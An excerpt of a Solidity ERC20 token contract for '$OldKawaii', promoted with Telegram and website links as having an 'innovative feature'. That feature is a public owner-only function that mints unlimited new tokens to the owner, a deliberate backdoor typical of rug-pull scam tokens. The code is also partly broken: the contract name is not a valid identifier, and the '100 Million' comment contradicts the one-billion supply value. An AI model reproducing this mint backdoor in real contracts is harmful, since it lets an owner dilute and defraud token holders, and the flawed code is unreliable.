...
//
// $OldKawaii proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/OldKawaiiBsc
//  📱Website :: https://OldKawaii.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _OldKawaii(uint256 amount) public onlyOwner {
 _OldKawaii(msg.sender, amount);
    }
    ...
    function _OldKawaii(address account, uint256 amount) internal virtual {
...
contract $OldKawaii is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Old Kawaii", "OLDKAWAII") {
     _OldKawaii(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}